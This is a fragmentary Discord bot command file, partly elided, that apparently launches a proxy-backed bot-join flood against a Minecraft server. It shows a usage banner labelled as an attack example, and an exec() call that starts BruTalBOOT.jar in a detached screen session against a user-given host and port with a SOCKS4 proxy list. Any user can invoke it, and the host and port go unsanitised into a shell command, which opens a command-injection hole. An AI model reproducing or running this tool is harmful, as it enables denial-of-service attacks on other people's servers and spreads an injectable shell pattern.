...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công ;invisiblenicksjoin 1.1.1.1 25565 47`")
...
exec(`screen -d -m timeout 60 java -jar BruTalBOOT.jar ${host}:${port} 18 1 ${protocol} 1000 1000 1000 100 10 proxies.txt socks4`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
...
exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['invisiblenicksjoin'],
  permLevel: 0
}

exports.help = {
  name: 'invisiblenicksjoin',
  description: 'Özel',
  usage: 'invisiblenicksjoin'
}